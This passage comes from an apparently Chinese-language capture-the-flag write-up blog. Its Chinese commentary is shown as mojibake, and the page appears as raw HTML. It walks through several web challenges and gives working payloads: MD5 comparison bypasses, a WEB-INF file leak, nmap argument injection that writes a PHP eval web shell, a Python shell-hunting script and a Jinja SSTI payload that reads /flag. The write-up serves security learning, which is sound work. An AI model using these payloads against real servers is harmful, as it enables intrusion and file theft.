ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>  <br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;  <span class=\"hljs-comment\">//flag.php  </span><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;  <br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__tostring</span>(<span class=\"hljs-params\"></span>)</span>&#123;  <br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;  <br>            <span class=\"hljs-keyword\">echo</span> file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;file); <br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>ç›´æ¥æ„é€ payloadå°±å¯ä»¥æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h2><ol>\n<li><p>æŠ“åŒ…ï¼Œåœ¨headeréƒ¨åˆ†æ‹¿åˆ°hintï¼šâ€select * from â€˜adminâ€™ where password=md5($pass,true)â€œï¼Œä¹‹å‰é‡åˆ°è¿‡ï¼Œè¾“å…¥å¯†ç â€ffifdyopâ€œï¼Œè·³è½¬åˆ°  levels91.php</p>\n</li>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-comment\">&lt;!--</span><br><span class=\"hljs-comment\">$a = $GET[&#x27;a&#x27;];</span><br><span class=\"hljs-comment\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class=\"hljs-comment\">    // wow, glzjin wants a girl friend.</span><br><span class=\"hljs-comment\">--&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>?a=s155964671a&amp;b=s878926199aè·³è½¬åˆ° levell14.php</p>\n</li>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param1&#x27;</span>]!==<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param1&#x27;</span>])===md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;param2&#x27;</span>]))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure>\n\n<p>å¼ºç±»å‹æ¯”è¾ƒï¼Œä½†æ˜¯phpä¸­MD5ï¼ˆæ•°ç»„ï¼‰å°†ä¼šè¿”å›NULLï¼Œå› æ­¤POST<code>param1[]=1&amp;param2[]=2</code>å³å¯æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h2><ol>\n<li>WEB-INF/web.xmlæ³„éœ²ï¼Œ<a href=\"https://blog.csdn.net/wy_97/article/details/78165051\">https://blog.csdn.net/wy_97/article/details/78165051</a></li>\n<li>ä¿®æ”¹è¯·æ±‚æ–¹æ³•      ?filename=WEB-INF/web.xmlå¯ä»¥çœ‹åˆ°â€/Download                 FlagController        com.wm.ctf.FlagController                FlagController        /Flag â€œ</li>\n<li>filename=WEB-INF/classes/com/wm/ctf/FlagController.class å…¶ä¸­æœ‰ä¸€æ®µbase64ç¼–ç ï¼Œè§£ç æ‹¿åˆ°flag   </li>\n</ol>\n<h2 id=\"BUUCTF-2018-Online-Tool\"><a href=\"#BUUCTF-2018-Online-Tool\" class=\"headerlink\" title=\"[BUUCTF 2018]Online Tool\"></a>[BUUCTF 2018]Online Tool</h2><ol>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;REMOTE_ADDR&#x27;</span>] = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;host&#x27;</span>])) &#123;<br>    highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-variable\">$host</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;host&#x27;</span>];<br>    <span class=\"hljs-variable\">$host</span> = escapeshellarg(<span class=\"hljs-variable\">$host</span>);<br>    <span class=\"hljs-variable\">$host</span> = escapeshellcmd(<span class=\"hljs-variable\">$host</span>);<br>    <span class=\"hljs-variable\">$sandbox</span> = md5(<span class=\"hljs-string\">&quot;glzjin&quot;</span>. <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;you are in sandbox &#x27;</span>.<span class=\"hljs-variable\">$sandbox</span>;<br>    @mkdir(<span class=\"hljs-variable\">$sandbox</span>);<br>    chdir(<span class=\"hljs-variable\">$sandbox</span>);<br>    <span class=\"hljs-keyword\">echo</span> system(<span class=\"hljs-string\">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class=\"hljs-variable\">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>è€ƒç‚¹åº”è¯¥æ˜¯bypass  escapeshellargå’Œescapeshellcmdä»¥åŠå‚æ•°æ³¨å…¥</p>\n</li>\n<li><p>nmapçš„å‚æ•°æ³¨å…¥çš„è¯æœ‰ä¸€ä¸ª<code>-oG</code>æˆ–è€…<code>-oN</code>æˆ–è€…<code>-o</code>éƒ½å¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•ç»•è¿‡ä¸¤ä¸ªå‡½æ•°äº†</p>\n</li>\n<li><p>[<a href=\"https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD]\">https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5%20-%20escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/#%E7%BB%93%E8%AF%AD]</a>(<a href=\"https://mochazz.github.io/2018/07/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day5\">https://mochazz.github.io/2018/07/30/ä»£ç å®¡è®¡Day5</a> - escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“/#ç»“è¯­)</p>\n</li>\n<li><p><a href=\"https://paper.seebug.org/164/\">https://paper.seebug.org/164/</a></p>\n</li>\n<li><p>çœ‹åˆ°äº†è¿™ä¸¤ä¸ªå‡½æ•°å…¬ç”¨å¯¼è‡´çš„å¼•å·é€ƒé€¸</p>\n</li>\n<li><p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•payloadäº†ï¼Œå¼•å·è¿™ä¸ªä¸œè¥¿æœ‰ç‚¹éš¾è°ƒè¯•</p>\n</li>\n<li><p>æœ€åpayload<code>?host=&#39; &lt;?php @eval($_POST[&quot;flag&quot;]);?&gt; -oG flag.php &#39;</code></p>\n</li>\n</ol>\n<h2 id=\"å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢\"><a href=\"#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢\" class=\"headerlink\" title=\"[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢\"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><ol>\n<li><p>æºç ä¸­æœ‰å‡ åƒä¸ªshellï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯ä¸èƒ½ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬ç”¨è„šæœ¬æ‰¾å‡ºå¯ä»¥ç”¨çš„shell</p>\n</li>\n<li><p>åˆšå¼€å§‹å†™äº†ä¸ªåƒåœ¾å•çº¿ç¨‹è„šæœ¬ï¼Œè·‘åº”è¯¥æ˜¯è·‘çš„å‡ºæ¥çš„ï¼Œå°±æ˜¯å¯èƒ½è¦æŒºä¹…</p>\n</li>\n<li><p>ç„¶åå°è¯•å†™äº†ä¸ªå¤šçº¿ç¨‹çš„è„šæœ¬ï¼Œä½†æ˜¯ä¸€ä¸ªä¸€ä¸ªéå†å‚æ•°ï¼Œä¼°è®¡ä¹Ÿæ˜¯è¦å¥½ä¹…</p>\n</li>\n<li><p>ç½‘ä¸Šçœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è„šæœ¬ï¼Œä¸€ä¸ªæ–‡ä»¶åªè®¿é—®ä¸€æ¬¡ï¼ŒæŠŠæ‰€æœ‰å‚æ•°ä¸€æ¬¡éƒ½ä¼ è¿‡å»è¿™æ ·å°±å‡å°‘äº†å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œåœ¨ç¡®è®¤æŸä¸€ä¸ªæ–‡ä»¶å­˜åœ¨shellä¹‹åå†éå†æ‰€æœ‰å‚æ•°æ¥æ‰¾åˆ°å¯ç”¨å‚æ•°</p>\n</li>\n<li><p>expï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> re<br><span class=\"hljs-keyword\">import</span> threading<br><span class=\"hljs-keyword\">import</span> time<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(<span class=\"hljs-number\">100</span>)  \t\t\t\t\t\t\t  \t\t\t<span class=\"hljs-comment\">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span><br>filePath = <span class=\"hljs-string\">r&quot;D:/phpstudy_pro/WWW/src&quot;</span><br>os.chdir(filePath)\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#æ”¹å˜å½“å‰çš„è·¯å¾„</span><br>requests.adapters.DEFAULT_RETRIES = <span class=\"hljs-number\">5</span>\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span><br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class=\"hljs-literal\">False</span>\t\t\t\t\t\t\t\t\t\t\t <span class=\"hljs-comment\"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_content</span>(<span class=\"hljs-params\">file</span>):</span><br>    s1.acquire()\t\t\t\t\t\t\t\t\t\t\t\t<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;trying   &#x27;</span>+file+ <span class=\"hljs-string\">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file,encoding=<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>) <span class=\"hljs-keyword\">as</span> f:\t\t\t\t\t\t\t<span class=\"hljs-comment\">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span><br>            gets = <span class=\"hljs-built_in\">list</span>(re.findall(<span class=\"hljs-string\">&#x27;\\$_GET\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;</span>, f.read()))<br>            posts = <span class=\"hljs-built_in\">list</span>(re.findall(<span class=\"hljs-string\">&#x27;\\$_POST\\[\\&#x27;(.*?)\\&#x27;\\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#æ‰€æœ‰çš„$_POST</span><br>    params = &#123;&#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#æ‰€æœ‰çš„$_GET</span><br>    <span class=\"hljs-keyword\">for</span> m <span class=\"hljs-keyword\">in</span> gets:<br>        params[m] = <span class=\"hljs-string\">&quot;whoami&quot;</span><br>    <span class=\"hljs-keyword\">for</span> n <span class=\"hljs-keyword\">in</span> posts:<br>        data[n] = <span class=\"hljs-string\">&quot;whoami&quot;</span><br>    url = <span class=\"hljs-string\">&#x27;http://127.0.0.1/src/&#x27;</span>+file<br>    req = session.post(url, data=data, params=params)\t\t\t<span class=\"hljs-comment\">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span><br>    req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br>    req.encoding = <span class=\"hljs-string\">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class=\"hljs-comment\">#print(content)</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span><br>        flag = <span class=\"hljs-number\">0</span><br>        <span class=\"hljs-keyword\">for</span> a <span class=\"hljs-keyword\">in</span> gets:<br>            req = session.get(url+<span class=\"hljs-string\">&#x27;?%s=&#x27;</span>%a+<span class=\"hljs-string\">&quot;whoami&quot;</span>)<br>            content = req.text<br>            req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:<br>                flag = <span class=\"hljs-number\">1</span><br>                <span class=\"hljs-keyword\">break</span><br>        <span class=\"hljs-keyword\">if</span> flag != <span class=\"hljs-number\">1</span>:<br>            <span class=\"hljs-keyword\">for</span> b <span class=\"hljs-keyword\">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class=\"hljs-string\">&quot;whoami&quot;</span>&#125;)<br>                content = req.text<br>                req.close()\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br>                <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;32720&quot;</span> <span class=\"hljs-keyword\">in</span> content:<br>                    <span class=\"hljs-keyword\">break</span><br>        <span class=\"hljs-keyword\">if</span> flag == <span class=\"hljs-number\">1</span>:\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span><br>            param = a<br>        <span class=\"hljs-keyword\">else</span>:<br>            param = b<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span>+file+<span class=\"hljs-string\">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> %param)<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> files:\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"hljs-comment\">#åŠ å…¥å¤šçº¿ç¨‹</span><br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()<br><br></code></pre></td></tr></table></figure>\n\n<p>æœç„¶è¿˜æ˜¯èœçš„æƒ¨ä¸å¿ç¹</p>\n</li>\n</ol>\n<h2 id=\"BJDCTF-2nd-fake-google\"><a href=\"#BJDCTF-2nd-fake-google\" class=\"headerlink\" title=\"[BJDCTF 2nd]fake google\"></a>[BJDCTF 2nd]fake google</h2><ol>\n<li>æµ‹è¯•<code>&lt;script&gt;alert(111)&lt;/script&gt;</code>å¯ä»¥æ‰§è¡Œ</li>\n<li>æŸ¥çœ‹ç½‘é¡µæºä»£ç æç¤ºssti</li>\n<li>?name=3æµ‹è¯•çš„ç¡®å­˜åœ¨ssti</li>\n<li>æœ€ç»ˆpayloadï¼š<code>?name=&#123;&#123;True.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125;</code>ç›´æ¥æ‹¿åˆ°flag</li>\n</ol>\n<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><ol>\n<li><p>è®¿é—®æ‹¿åˆ°æºç ï¼Œæºç å®¡è®¡</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#! /usr/bin/env python</span><br><span class=\"hljs-comment\">#encoding=utf-8</span><br><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> Flask<br><span class=\"hljs-keyword\">from</span> flask <span class=\"hljs-keyword\">import</span> request<br><span class=\"hljs-keyword\">import</span> socket<br><span class=\"hljs-keyword\">import</span> hashlib<br><span class=\"hljs-keyword\">import</span> urllib<br><span class=\"hljs-keyword\">import</span> sys<br><span class=\"hljs-keyword\">import</span> os<br><span class=\"hljs-keyword\">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class=\"hljs-string\">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class=\"hljs-number\">16</span>)<br><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Task</span>:</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span>(<span class=\"hljs-params\">self, action, param, sign, ip</span>):</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"hljs-comment\">#SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">Exec</span>(<span class=\"hljs-params\">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">500</span><br>        <span class=\"hljs-keyword\">if</span> (self.checkSign()):<br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;scan&quot;</span> <span class=\"hljs-keyword\">in</span> self.action:<br>                tmpfile = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"hljs-string\">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class=\"hljs-keyword\">if</span> (resp == <span class=\"hljs-string\">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = resp<br>                <span class=\"hljs-keyword\">else</span>:<br>                    <span class=\"hljs-built_in\">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">200</span><br>            <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;read&quot;</span> <span class=\"hljs-keyword\">in</span> self.action:<br>                f = <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class=\"hljs-string\">&#x27;r&#x27;</span>)<br>                result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">200</span><br>                result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = f.read()<br>            <span class=\"hljs-keyword\">if</span> result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] == <span class=\"hljs-number\">500</span>:<br>                result[<span class=\"hljs-string\">&#x27;data&#x27;</span>] = <span class=\"hljs-string\">&quot;Action Error&quot;</span><br>        <span class=\"hljs-keyword\">else</span>:<br>            result[<span class=\"hljs-string\">&#x27;code&#x27;</span>] = <span class=\"hljs-number\">500</span><br>            result[<span class=\"hljs-string\">&#x27;msg&#x27;</span>] = <span class=\"hljs-string\">&quot;Sign Error&quot;</span><br>        <span class=\"hljs-keyword\">return</span> result<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">checkSign</span>(<span class=\"hljs-params\">self</span>):</span><br>        <span class=\"hljs-keyword\">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span 